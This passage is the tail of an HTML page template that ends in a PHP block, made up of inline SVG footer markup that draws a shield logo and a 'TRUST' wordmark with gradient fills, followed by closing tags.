            <path d="M214.908 47.3054H228.314C228.925 50.3 230.981 51.5601 235.926 51.5601C239.964 51.5601 242.324 50.6162 242.324 48.8817C242.324 47.5389 241.181 46.6705 237.911 45.9626L227.098 43.5177C219.863 41.866 216.207 37.6867 216.207 30.9823C216.207 22.1493 222.678 17.5784 235.243 17.5784C247.807 17.5784 253.974 22.0326 255.044 31.5759H241.721C241.495 29.0556 238.901 27.5133 234.639 27.5133C231.214 27.5133 229.01 28.6153 229.01 30.2744C229.01 31.6926 230.453 32.7946 233.352 33.5098L244.696 36.2709C252.157 38.0808 255.74 41.8684 255.74 48.0157C255.74 56.5324 248.352 61.5778 235.795 61.5778C223.237 61.5778 214.93 56.1383 214.93 47.3054H214.915H214.908Z" style="fill:currentColor" class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"></path>
            <path d="M293.858 31.5687V18.6951H258.526V31.576H269.069V60.0842H283.31V31.5687H293.858Z" style="fill:currentColor" class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"></path>
            <path d="M129.476 31.5687V18.6951H94.1469V31.576H104.69V60.0842H118.933V31.5687H129.476Z" style="fill:currentColor" class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"></path>
            <path d="M1.47009 11.4213L36.6098 0V79.0661C11.5096 68.523 1.47009 48.3173 1.47009 36.8985V11.4213Z" style="fill:currentColor" class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"></path>
            <path d="M71.7523 11.4213L36.6127 0V79.0661C61.7128 68.523 71.7523 48.3173 71.7523 36.8985V11.4213Z" fill="url(#paint0_linear_1578_1401183940820)" class="default-transition opacity-0 [transition-property:opacity] dark:opacity-100"></path>
            <path d="M71.7523 11.4213L36.6127 0V79.0661C61.7128 68.523 71.7523 48.3173 71.7523 36.8985V11.4213Z" fill="url(#paint0_linear_1578_1023423940820)" class="default-transition opacity-100 [transition-property:opacity] dark:opacity-0"></path>
          </g>
          <defs>
            <linearGradient id="paint0_linear_1578_1401183940820" x1="35.1288" y1="89.0035" x2="63.8924" y2="-15.0289" gradientUnits="userSpaceOnUse">
              <stop offset="0.26" stop-color="#48FF91"></stop>
              <stop offset="0.66" stop-color="#0094FF"></stop>
              <stop offset="0.8" stop-color="#0038FF"></stop>
              <stop offset="0.89" stop-color="#0500FF"></stop>
            </linearGradient>
            <linearGradient id="paint0_linear_1578_1023423940820" x1="61.762" y1="-4.56968" x2="35.2193" y2="78.953" gradientUnits="userSpaceOnUse">
              <stop offset="0.02" stop-color="#0000FF"></stop>
              <stop offset="0.08" stop-color="#0094FF"></stop>
              <stop offset="0.16" stop-color="#48FF91"></stop>
              <stop offset="0.42" stop-color="#0094FF"></stop>
              <stop offset="0.68" stop-color="#0038FF"></stop>
              <stop offset="0.9" stop-color="#0500FF"></stop>
            </linearGradient>
            <clipPath id="clip0_1578_1401183940820">
              <rect width="291.936" height="79.0661" fill="white" transform="translate(0.814331)"></rect>
            </clipPath>
          </defs>
        </svg>
        <div class="hidden desktop:block">
          <svg width="1569" height="346" viewBox="0 0 1569 346" fill="none" class="mr-24 h-auto w-[180px]">
            <path d="M309.229 8.77148H418.65V70.0622C454.5 14.9789 495.755 8.77148 556.148 8.77148V117.085H528.645C456.276 117.085 421.63 151.14 421.63 218.6V333.732H309.229V8.77148Z" style="fill:currentcolor" class="default-transition text-trustBlue dark:text-trustGreen"></path>
            <path d="M921.249 333.712H808.866V302.732C784.323 331.21 750.88 343.586 709.644 343.586C631.335 343.586 587.062 297.155 587.062 211.761V8.75073H699.445V186.415C699.445 226.62 719.175 250.132 752.637 250.132C786.1 250.132 808.847 227.212 808.847 188.249V8.75073H921.229V333.712H921.249Z" style="fill:currentcolor" class="default-transition text-trustBlue dark:text-trustGreen"></path>
            <path d="M948.715 233.397H1053.97C1058.77 256.909 1074.91 266.803 1113.74 266.803C1145.44 266.803 1163.97 259.392 1163.97 245.774C1163.97 235.231 1154.99 228.412 1129.32 222.854L1044.42 203.659C987.621 190.691 958.914 157.877 958.914 105.239C958.914 35.8882 1009.72 0 1108.37 0C1207.02 0 1255.44 34.9714 1263.84 109.899H1159.23C1157.45 90.112 1137.09 78.0028 1103.63 78.0028C1076.74 78.0028 1059.44 86.655 1059.44 99.6809C1059.44 110.816 1070.76 119.468 1093.53 125.083L1182.59 146.761C1241.17 160.972 1269.3 190.71 1269.3 238.974C1269.3 305.842 1211.3 345.455 1112.7 345.455C1014.11 345.455 948.887 302.748 948.887 233.397H948.772H948.715Z" style="fill:currentcolor" class="default-transition text-trustBlue dark:text-trustGreen"></path>
            <path d="M1568.57 109.826V8.75073H1291.17V109.883H1373.94V333.712H1485.75V109.826H1568.57Z" style="fill:currentcolor" class="default-transition text-trustBlue dark:text-trustGreen"></path>
            <path d="M277.954 109.826V8.75073H0.570312V109.883H83.3481V333.712H195.176V109.826H277.954Z" style="fill:currentcolor" class="default-transition text-trustBlue dark:text-trustGreen"></path>
          </svg>
          <span class="default-transition invisible hidden dark:visible dark:block">
            <svg width="39" height="43" viewBox="0 0 39 43" fill="none" exponent="92384" class="mt-4 h-auto w-[180px]">
              <path d="M0.710815 6.67346L19.4317 0.606445V42.6064C6.05944 37.0059 0.710815 26.2727 0.710815 20.207V6.67346Z" style="fill:currentcolor" class="text-trustBlue dark:text-trustGreen"></path>
              <path d="M38.1537 6.67346L19.4329 0.606445V42.6064C32.8051 37.0059 38.1537 26.2727 38.1537 20.207V6.67346Z" fill="url(#paint0_linear_524_7759592384)"></path>
              <path d="M38.1537 6.67346L19.4329 0.606445V42.6064C32.8051 37.0059 38.1537 26.2727 38.1537 20.207V6.67346Z" fill="url(#paint1_linear_524_7759592384)"></path>
              <defs>
                <linearGradient id="paint1_linear_524_7759592384" x1="18.6423" y1="47.8852" x2="33.8833" y2="-7.39981" gradientUnits="userSpaceOnUse">
                  <stop offset="0.26" stop-color="#48FF91"></stop>
                  <stop offset="0.66" stop-color="#0094FF"></stop>
                  <stop offset="0.8" stop-color="#0038FF"></stop>
                  <stop offset="0.89" stop-color="#0500FF"></stop>
                </linearGradient>
              </defs>
            </svg>
          </span>
          <span class="default-transition visible block opacity-100 dark:invisible dark:hidden dark:opacity-0">
            <svg width="39" height="43" viewBox="0 0 39 43" fill="none" xmlns="http://www.w3.org/2000/svg" exponent="92384" class="mt-4 h-auto w-[180px]">
              <path d="M0.710815 6.67346L19.4317 0.606445V42.6064C6.05944 37.0059 0.710815 26.2727 0.710815 20.207V6.67346Z" fill="#0500FF"></path>
              <path d="M38.1537 6.67346L19.4329 0.606445V42.6064C32.8051 37.0059 38.1537 26.2727 38.1537 20.207V6.67346Z" fill="url(#paint0_linear_524_7586892384)"></path>
              <defs>
                <linearGradient id="paint0_linear_524_7586892384" x1="33.1809" y1="-2.33467" x2="19.115" y2="42.0564" gradientUnits="userSpaceOnUse">
                  <stop offset="0.02" stop-color="#0000FF"></stop>
                  <stop offset="0.08" stop-color="#0094FF"></stop>
                  <stop offset="0.16" stop-color="#48FF91"></stop>
                  <stop offset="0.42" stop-color="#0094FF"></stop>
                  <stop offset="0.68" stop-color="#0038FF"></stop>
                  <stop offset="0.9" stop-color="#0500FF"></stop>
                </linearGradient>
              </defs>
            </svg>
          </span>
        </div>
      </div>
    </footer>
  </body>
</html>
<?php } ?>